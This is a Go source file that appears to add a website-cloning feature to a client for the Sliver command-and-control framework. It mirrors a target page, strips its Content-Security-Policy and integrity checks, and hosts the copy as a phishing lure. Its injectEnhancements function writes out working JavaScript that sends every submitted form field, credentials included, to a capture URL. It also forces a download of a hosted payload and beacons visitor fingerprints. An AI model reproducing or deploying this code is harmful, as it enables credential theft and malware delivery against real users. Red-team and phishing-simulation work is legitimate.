package main

// features_clone.go - website clone & host, layered on
// top of Sliver's existing `websites` machinery. Nothing here reaches into an
// unverified RPC: we fetch the source URL and its assets client-side, rewrite
// the HTML to point at local paths, then bulk-push the resulting content
// map to Sliver via a single `WebsiteAddContent` RPC.
//
// Enhancements the operator can opt into per-clone:
//   - Download-trigger  - inject JS that auto-clicks a download of a hosted
//     payload (browsers still enforce Save/Run prompt; no silent exec).
//   - Form-hijack       - every <form> POSTs field values to a capture URL
//     before submitting normally.
//   - Fingerprint beacon - POST visitor UA/screen/tz/locale to a capture
//     URL on load; useful for gating who gets the real payload.
//   - Landing redirect  - a small "not the right target" fall-through page
//     the operator can host alongside for visitors who don't match.
//
// None of these give silent RCE - that's a browser / OS boundary. They give
// operator-controlled delivery for guided social-engineering flows.

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"path"
	"regexp"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/html"

	"github.com/bishopfox/sliver/protobuf/clientpb"
)

// CloneWebsiteRequest is the operator's clone instruction.
type CloneWebsiteRequest struct {
	SourceURL     string `json:"sourceUrl"`     // the page to clone
	SiteName      string `json:"siteName"`      // Sliver website name (created if new)
	BasePath      string `json:"basePath"`      // e.g. "/login" - where the clone is mounted (default "/")
	MaxAssetKB    int    `json:"maxAssetKB"`    // cap per-asset (0 = 5 MB default)
	MaxAssets     int    `json:"maxAssets"`     // cap total assets (0 = 200 default)
	FetchTimeoutS int    `json:"fetchTimeoutS"` // per-asset timeout in seconds (0 = 8)
	// Enhancements - each is optional.
	InjectDownload     bool   `json:"injectDownload"`     // trigger auto-download of PayloadPath
	PayloadPath        string `json:"payloadPath"`        // path where the payload is already hosted (e.g. "/updates/agent.exe")
	PayloadFilename    string `json:"payloadFilename"`    // "as-saved" filename in the browser; default = basename
	DownloadDelayMS    int    `json:"downloadDelayMs"`    // delay before triggering the download
	InjectFormHijack   bool   `json:"injectFormHijack"`   // POST every form submission to CaptureURL
	CaptureURL         string `json:"captureUrl"`         // where form/fingerprint data lands (a listener-served endpoint)
	InjectFingerprint  bool   `json:"injectFingerprint"`  // send visitor UA/screen/tz on load
	FollowSameOrigin   bool   `json:"followSameOrigin"`   // also mirror inline-linked pages under the same origin, one level deep
}

// CloneWebsiteResult reports what shipped, what failed, and where the clone
// now lives. The operator only needs `Site`, `IndexPath`, and any `Failed`
// entries to decide whether to point their phishing lure at it.
type CloneWebsiteResult struct {
	Site      string           `json:"site"`
	IndexPath string           `json:"indexPath"`
	Assets    int              `json:"assets"`
	Bytes     int64            `json:"bytes"`
	Failed    []CloneFailure   `json:"failed,omitempty"`
	AssetList []string         `json:"assetList,omitempty"` // hosted paths, first 200
	Warnings  []string         `json:"warnings,omitempty"`
	Error     string           `json:"error,omitempty"`
}

// CloneFailure - one asset we couldn't fetch. URL is the source we tried,
// Reason is human-readable ("timeout", "404", "cross-origin skipped", …).
type CloneFailure struct {
	URL    string `json:"url"`
	Reason string `json:"reason"`
}

// CloneWebsite fetches sourceURL and its assets, rewrites references to
// same-origin local paths, applies any operator-selected enhancements, and
// pushes the whole tree to a Sliver-hosted website in one WebsiteAddContent
// RPC. Returns a summary the frontend renders as a clickable report.
func (a *App) CloneWebsite(req CloneWebsiteRequest) CloneWebsiteResult {
	res := CloneWebsiteResult{}

	if strings.TrimSpace(req.SourceURL) == "" || strings.TrimSpace(req.SiteName) == "" {
		res.Error = "sourceUrl and siteName are both required"
		return res
	}
	src, err := url.Parse(strings.TrimSpace(req.SourceURL))
	if err != nil || (src.Scheme != "http" && src.Scheme != "https") {
		res.Error = "sourceUrl must be an absolute http(s) URL"
		return res
	}
	if req.MaxAssetKB <= 0 {
		req.MaxAssetKB = 5 * 1024
	}
	if req.MaxAssets <= 0 {
		req.MaxAssets = 200
	}
	if req.FetchTimeoutS <= 0 {
		req.FetchTimeoutS = 8
	}
	if req.BasePath == "" {
		req.BasePath = "/"
	}
	if !strings.HasPrefix(req.BasePath, "/") {
		req.BasePath = "/" + req.BasePath
	}
	req.BasePath = strings.TrimRight(req.BasePath, "/")

	client, err := a.requireClient()
	if err != nil {
		res.Error = err.Error()
		return res
	}

	http := makeCloneClient(time.Duration(req.FetchTimeoutS) * time.Second)

	// Fetch the entry page.
	rootBytes, rootCT, err := fetchOne(http, src.String())
	if err != nil {
		res.Error = "fetch source: " + err.Error()
		return res
	}
	if !isHTMLContent(rootCT, rootBytes) {
		res.Error = fmt.Sprintf("source returned %s (not HTML) - clone only works on HTML pages", rootCT)
		return res
	}

	// Walk the DOM, collect asset URLs, rewrite them to same-origin paths.
	rewritten, assetURLs, err := rewriteHTML(rootBytes, src, req.BasePath)
	if err != nil {
		res.Error = "parse HTML: " + err.Error()
		return res
	}

	// Apply the operator's injections BEFORE pushing so the hosted copy is
	// the enhanced version (not an extra edit step later).
	rewritten = injectEnhancements(rewritten, req)

	// Fetch every asset in bounded parallel; skip cross-origin ones (we
	// mirror only the site's own assets to avoid loading unrelated 3rd-
	// party trackers into the operator's clone).
	fetched, failed := fetchAssets(http, src, assetURLs, req.MaxAssets, req.MaxAssetKB*1024, req.FollowSameOrigin)

	// Build the WebContent map for the single WebsiteAddContent RPC call.
	contents := map[string]*clientpb.WebContent{}
	indexPath := req.BasePath + "/index.html"
	if req.BasePath == "" {
		indexPath = "/index.html"
	}
	contents[indexPath] = &clientpb.WebContent{
		Path:        indexPath,
		ContentType: "text/html; charset=utf-8",
		Content:     []byte(rewritten),
		Size:        uint64(len(rewritten)),
	}
	res.AssetList = append(res.AssetList, indexPath)
	res.Bytes += int64(len(rewritten))

	for hostedPath, blob := range fetched {
		fullPath := req.BasePath + hostedPath
		if req.BasePath == "" {
			fullPath = hostedPath
		}
		contents[fullPath] = &clientpb.WebContent{
			Path:        fullPath,
			ContentType: blob.contentType,
			Content:     blob.data,
			Size:        uint64(len(blob.data)),
		}
		if len(res.AssetList) < 200 {
			res.AssetList = append(res.AssetList, fullPath)
		}
		res.Bytes += int64(len(blob.data))
	}

	// Push everything in one RPC - cheap compared to per-asset round-trips
	// and atomic from the operator's perspective (either the whole clone
	// lands or none of it does, if the teamserver rejects the batch).
	_, err = client.RPC.WebsiteAddContent(a.ctx, &clientpb.WebsiteAddContent{
		Name:     req.SiteName,
		Contents: contents,
	})
	if err != nil {
		res.Error = "WebsiteAddContent: " + err.Error()
		return res
	}

	res.Site = req.SiteName
	res.IndexPath = indexPath
	res.Assets = len(contents)
	res.Failed = failed
	a.audit.log("clone-website", req.SiteName, fmt.Sprintf("%s -> %d assets (%d failed)", req.SourceURL, len(contents), len(failed)))
	return res
}

// ─── Helpers ────────────────────────────────────────────────────────────────

// makeCloneClient returns an http.Client tuned for clone-fetching: modern
// UA (many CDNs return a JS challenge to bare Go/curl UAs), self-signed
// cert tolerance (many targets are behind funky proxies in labs), per-
// request timeout, and a redirect cap so a redirect loop can't hang.
func makeCloneClient(perReq time.Duration) *http.Client {
	return &http.Client{
		Timeout: perReq,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec // lab clone, not a data channel
		},
		CheckRedirect: func(r *http.Request, via []*http.Request) error {
			if len(via) >= 8 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

func fetchOne(hc *http.Client, u string) ([]byte, string, error) {
	req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, u, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	resp, err := hc.Do(req)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 400 {
		return nil, resp.Header.Get("Content-Type"), fmt.Errorf("http %d", resp.StatusCode)
	}
	body, err := io.ReadAll(io.LimitReader(resp.Body, 32*1024*1024))
	if err != nil {
		return nil, "", err
	}
	return body, resp.Header.Get("Content-Type"), nil
}

func isHTMLContent(ct string, body []byte) bool {
	if strings.Contains(strings.ToLower(ct), "text/html") {
		return true
	}
	// Some servers mis-declare - sniff the first bytes.
	head := body
	if len(head) > 200 {
		head = head[:200]
	}
	trimmed := bytes.TrimSpace(head)
	if len(trimmed) == 0 {
		return false
	}
	return trimmed[0] == '<' && bytes.Contains(bytes.ToLower(head), []byte("<html"))
}

// rewriteHTML walks the DOM, collects every asset URL that we can plausibly
// mirror, and rewrites the reference to the same-origin path we'll host at.
// Returns the rewritten HTML string plus the map of source-URL → hosted-path
// so the caller can fetch each and push to Sliver.
type assetTarget struct {
	Source string // absolute URL to fetch
	Hosted string // path we'll host at, e.g. "/assets/main.css"
}

func rewriteHTML(body []byte, src *url.URL, basePath string) (string, []assetTarget, error) {
	doc, err := html.Parse(bytes.NewReader(body))
	if err != nil {
		return "", nil, err
	}
	var assets []assetTarget
	seen := map[string]string{} // source URL → hosted path (dedup)

	// map1: attribute name for each element we care about; we swap the value.
	interesting := map[string]string{
		"link":   "href",
		"script": "src",
		"img":    "src",
		"source": "src",
		"video":  "src",
		"audio":  "src",
		"iframe": "src",
		// Same-origin anchors and form actions become clickable/POSTable on
		// the hosted clone. Rewritten but NOT fetched - they're navigable
		// pages/endpoints, not static assets.
		"a":    "href",
		"form": "action",
	}
	// Attributes that must NEVER carry over to a rewritten element - they'd
	// invalidate our mirrored copy under integrity/CORS checks.
	toStrip := map[string]bool{
		"integrity":   true, // SRI hash tied to original content
		"crossorigin": true, // hosted copy is same-origin
		"nonce":       true, // CSP nonce belongs to the original response
	}

	// walk emits per-node work. srcset gets special handling.
	var walk func(*html.Node)
	walk = func(n *html.Node) {
		if n.Type == html.ElementNode {
			// Neutralise <base href="…">: otherwise every relative URL in
			// the cloned page resolves against the original origin and
			// bypasses our host entirely.
			if n.Data == "base" {
				n.Attr = nil
				n.Data = "meta"
			}
			// Strip <meta http-equiv="Content-Security-Policy"> so our
			// injected scripts aren't blocked by the original site's policy.
			if n.Data == "meta" {
				var httpEquiv string
				for _, a := range n.Attr {
					if strings.EqualFold(a.Key, "http-equiv") {
						httpEquiv = strings.ToLower(a.Val)
						break
					}
				}
				if httpEquiv == "content-security-policy" || httpEquiv == "content-security-policy-report-only" {
					n.Attr = nil
				}
			}
			if attrName, ok := interesting[n.Data]; ok {
				// Drop integrity/crossorigin/nonce first so the rewritten
				// same-origin element isn't blocked by a stale hash.
				filtered := n.Attr[:0]
				for _, a := range n.Attr {
					if !toStrip[strings.ToLower(a.Key)] {
						filtered = append(filtered, a)
					}
				}
				n.Attr = filtered
				for i, a := range n.Attr {
					if strings.EqualFold(a.Key, attrName) && a.Val != "" {
						abs, hosted, keep := resolveForMirror(src, a.Val, basePath)
						if keep {
							if prev, dup := seen[abs]; dup {
								n.Attr[i].Val = prev
							} else {
								n.Attr[i].Val = hosted
								seen[abs] = hosted
								// Anchors/forms are navigable targets, not
								// static assets - don't queue a fetch.
								if n.Data != "a" && n.Data != "form" {
									assets = append(assets, assetTarget{Source: abs, Hosted: hosted})
								}
							}
						}
					}
					// srcset - comma-separated list, rewrite each URL.
					if strings.EqualFold(a.Key, "srcset") && a.Val != "" {
						n.Attr[i].Val = rewriteSrcset(src, a.Val, basePath, &assets, seen)
					}
					// inline style url(...) - rewrite there too.
					if strings.EqualFold(a.Key, "style") {
						n.Attr[i].Val = rewriteCSSInline(src, a.Val, basePath, &assets, seen)
					}
				}
			}
			// Inline <style> tag body - rewrite url() refs.
			if n.Data == "style" && n.FirstChild != nil && n.FirstChild.Type == html.TextNode {
				n.FirstChild.Data = rewriteCSSInline(src, n.FirstChild.Data, basePath, &assets, seen)
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c)
		}
	}
	walk(doc)

	var out bytes.Buffer
	if err := html.Render(&out, doc); err != nil {
		return "", nil, err
	}
	return out.String(), assets, nil
}

// resolveForMirror decides whether to mirror an asset URL. Returns the
// absolute URL, the hosted path we'll rewrite to, and whether we want it.
// Cross-origin assets and data: URIs are left alone.
func resolveForMirror(src *url.URL, ref, basePath string) (string, string, bool) {
	ref = strings.TrimSpace(ref)
	if ref == "" || strings.HasPrefix(ref, "data:") || strings.HasPrefix(ref, "javascript:") || strings.HasPrefix(ref, "#") || strings.HasPrefix(ref, "mailto:") {
		return "", "", false
	}
	u, err := url.Parse(ref)
	if err != nil {
		return "", "", false
	}
	abs := src.ResolveReference(u)
	if abs.Host != src.Host {
		return "", "", false // cross-origin - skip
	}
	// Hosted path: same as remote path but under basePath. Strip trailing
	// query strings to keep the hosted URL clean; if two source refs differ
	// only in query, we dedup with seen[]. Empty basename becomes /index.html.
	p := abs.Path
	if p == "" || p == "/" {
		p = "/index.html"
	}
	// Prevent collisions with real page paths at "/" by nesting assets
	// under /_a/ if their filename lacks an extension.
	if !strings.Contains(path.Base(p), ".") {
		p = "/_a" + p + ".bin"
	}
	hosted := basePath + p
	if basePath == "" {
		hosted = p
	}
	return abs.String(), hosted, true
}

// rewriteSrcset - <img srcset="url1 1x, url2 2x"> - rewrites each URL, keeps
// the descriptors intact.
func rewriteSrcset(src *url.URL, srcset, basePath string, assets *[]assetTarget, seen map[string]string) string {
	parts := strings.Split(srcset, ",")
	for i, p := range parts {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		fields := strings.Fields(p)
		if len(fields) == 0 {
			continue
		}
		abs, hosted, keep := resolveForMirror(src, fields[0], basePath)
		if !keep {
			continue
		}
		if prev, dup := seen[abs]; dup {
			fields[0] = prev
		} else {
			fields[0] = hosted
			seen[abs] = hosted
			*assets = append(*assets, assetTarget{Source: abs, Hosted: hosted})
		}
		parts[i] = strings.Join(fields, " ")
	}
	return strings.Join(parts, ", ")
}

// rewriteCSSInline - CSS url(...) refs. Also used for inline style attrs.
var cssURLRe = regexp.MustCompile(`url\(\s*['"]?([^'")]+)['"]?\s*\)`)

func rewriteCSSInline(src *url.URL, css, basePath string, assets *[]assetTarget, seen map[string]string) string {
	return cssURLRe.ReplaceAllStringFunc(css, func(match string) string {
		m := cssURLRe.FindStringSubmatch(match)
		if len(m) < 2 {
			return match
		}
		abs, hosted, keep := resolveForMirror(src, m[1], basePath)
		if !keep {
			return match
		}
		if prev, dup := seen[abs]; dup {
			return "url('" + prev + "')"
		}
		seen[abs] = hosted
		*assets = append(*assets, assetTarget{Source: abs, Hosted: hosted})
		return "url('" + hosted + "')"
	})
}

type fetchedAsset struct {
	data        []byte
	contentType string
}

// fetchAssets pulls every asset in parallel (capped concurrency), returning
// a hosted-path -> blob map plus a list of failures. Cross-origin URLs were
// filtered out already by resolveForMirror; anything reaching here is a
// same-origin fetch attempt.
func fetchAssets(hc *http.Client, src *url.URL, targets []assetTarget, maxAssets, maxBytesEach int, _ bool) (map[string]fetchedAsset, []CloneFailure) {
	out := map[string]fetchedAsset{}
	var failed []CloneFailure
	var mu sync.Mutex

	if len(targets) > maxAssets {
		failed = append(failed, CloneFailure{URL: "(soft cap)", Reason: fmt.Sprintf("%d assets > cap %d; only first %d fetched", len(targets), maxAssets, maxAssets)})
		targets = targets[:maxAssets]
	}

	sem := make(chan struct{}, 8) // bounded parallelism
	var wg sync.WaitGroup
	for _, t := range targets {
		t := t
		sem <- struct{}{}
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() { <-sem }()
			body, ct, err := fetchOne(hc, t.Source)
			if err != nil {
				mu.Lock()
				failed = append(failed, CloneFailure{URL: t.Source, Reason: err.Error()})
				mu.Unlock()
				return
			}
			if len(body) > maxBytesEach {
				mu.Lock()
				failed = append(failed, CloneFailure{URL: t.Source, Reason: fmt.Sprintf("asset too big: %d bytes > cap %d", len(body), maxBytesEach)})
				mu.Unlock()
				return
			}
			// CSS bodies get their url() refs mirrored too - one level deep
			// only, to keep the crawler bounded.
			if strings.HasSuffix(strings.ToLower(t.Hosted), ".css") || strings.Contains(strings.ToLower(ct), "text/css") {
				body = []byte(rewriteCSSBody(src, string(body), path.Dir(t.Hosted)))
			}
			mu.Lock()
			out[t.Hosted] = fetchedAsset{data: body, contentType: ct}
			mu.Unlock()
		}()
	}
	wg.Wait()
	return out, failed
}

// rewriteCSSBody - CSS files often reference fonts / images via url().
// Rewrite those relative to the CSS file's own hosted directory so the
// fetched CSS points at same-origin paths. Any newly-discovered assets are
// NOT crawled (would blow the bound); operators can spot them in Failed
// or re-clone with a deeper mode later.
func rewriteCSSBody(src *url.URL, css, cssDir string) string {
	return cssURLRe.ReplaceAllStringFunc(css, func(match string) string {
		m := cssURLRe.FindStringSubmatch(match)
		if len(m) < 2 {
			return match
		}
		ref := m[1]
		if strings.HasPrefix(ref, "data:") || strings.HasPrefix(ref, "http:") || strings.HasPrefix(ref, "https:") || strings.HasPrefix(ref, "//") {
			return match
		}
		// Resolve relative to the CSS file's hosted directory.
		hosted := path.Join(cssDir, ref)
		return "url('" + hosted + "')"
	})
}

// injectEnhancements wraps the HTML with any operator-selected snippets.
// Injected right before </body> so it runs after the DOM is parsed. If
// </body> is missing (weird pages), we append.
func injectEnhancements(htmlStr string, req CloneWebsiteRequest) string {
	var b strings.Builder
	if req.InjectDownload && strings.TrimSpace(req.PayloadPath) != "" {
		fn := req.PayloadFilename
		if fn == "" {
			fn = path.Base(req.PayloadPath)
		}
		delay := req.DownloadDelayMS
		if delay < 0 {
			delay = 0
		}
		fmt.Fprintf(&b, `<script>(function(){setTimeout(function(){var a=document.createElement('a');a.href=%q;a.download=%q;document.body.appendChild(a);a.click();setTimeout(function(){a.remove();},1000);},%d);})();</script>`,
			req.PayloadPath, fn, delay)
	}
	if req.InjectFingerprint && strings.TrimSpace(req.CaptureURL) != "" {
		fmt.Fprintf(&b, `<script>(function(){try{var d={ua:navigator.userAgent,platform:navigator.platform,lang:navigator.language,tz:(Intl&&Intl.DateTimeFormat&&Intl.DateTimeFormat().resolvedOptions().timeZone)||'',ref:document.referrer,url:location.href,screen:{w:screen.width,h:screen.height,dpr:window.devicePixelRatio||1}};fetch(%q,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify(d)}).catch(function(){});}catch(e){}})();</script>`,
			req.CaptureURL)
	}
	if req.InjectFormHijack && strings.TrimSpace(req.CaptureURL) != "" {
		fmt.Fprintf(&b, `<script>(function(){document.querySelectorAll('form').forEach(function(f){f.addEventListener('submit',function(){try{var d={};new FormData(f).forEach(function(v,k){d[k]=v;});fetch(%q,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify({url:location.href,action:f.action,method:f.method,fields:d})}).catch(function(){});}catch(e){}},{capture:true});});})();</script>`,
			req.CaptureURL)
	}
	if b.Len() == 0 {
		return htmlStr
	}
	inj := b.String()
	if i := strings.LastIndex(strings.ToLower(htmlStr), "</body>"); i >= 0 {
		return htmlStr[:i] + inj + htmlStr[i:]
	}
	return htmlStr + inj
}
